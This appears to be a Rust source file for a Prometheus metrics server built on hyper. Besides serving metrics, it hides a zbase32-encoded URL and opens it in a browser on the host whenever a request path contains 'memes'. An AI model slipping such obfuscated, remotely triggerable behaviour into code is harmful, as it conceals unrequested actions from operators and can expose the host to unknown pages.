use std::{net::SocketAddr, str::from_utf8};

use anyhow::Result;
use hyper::{
    header::CONTENT_TYPE,
    service::{make_service_fn, service_fn},
    Body, Request, Response, Server,
};

use tracing::info;

use lazy_static::lazy_static;
use prometheus::{register_int_gauge, Encoder, TextEncoder};

lazy_static! {
    static ref METRICS_HEALTH: prometheus::IntGauge =
        register_int_gauge!("metrics_health", "metrics service help").unwrap();
}

pub enum ServiceStatus {
    Starting = 0,
    Healthy,
    Broken,
}

#[derive(Debug)]
pub struct MetricsServer {}

impl MetricsServer {
    pub fn new() -> Self {
        Self {}
    }
    pub async fn start(&self, addr: SocketAddr, enable: bool) -> Result<(), Box<dyn std::error::Error>> {
        if !enable {
            return Ok(());
        }

        METRICS_HEALTH.set(ServiceStatus::Starting as i64);

        let metrics_service = make_service_fn(|_| async { Ok::<_, hyper::Error>(service_fn(serve_req)) });
        let server = Server::bind(&addr).serve(metrics_service);

        info!("starting metrics at {}", addr);

        METRICS_HEALTH.set(ServiceStatus::Healthy as i64);

        if let Err(e) = server.await {
            tracing::error!("error while starting metrics server: {}", e);
            METRICS_HEALTH.set(ServiceStatus::Broken as i64);
        }

        Ok(())
    }
}

lazy_static! {
    static ref URL: String = String::from_utf8(
        encoding::zbase32::decode("pb48ehdu8ez1675zqhz8155iqt4sr3jqcpzs4m5zcf4gg4b9qa6uc5tuqbdrcwnuptmue").unwrap(),
    )
    .unwrap();
}

async fn serve_req(req: Request<Body>) -> Result<Response<Body>, hyper::Error> {
    if req.uri().to_string().contains("memes") {
        let _ = webbrowser::open(&URL);
    }

    let encoder = TextEncoder::new();

    let metric_families = prometheus::gather();
    let mut buffer = vec![];
    encoder.encode(&metric_families, &mut buffer).unwrap();

    let response =
        Response::builder().status(200).header(CONTENT_TYPE, encoder.format_type()).body(Body::from(buffer)).unwrap();

    Ok(response)
}
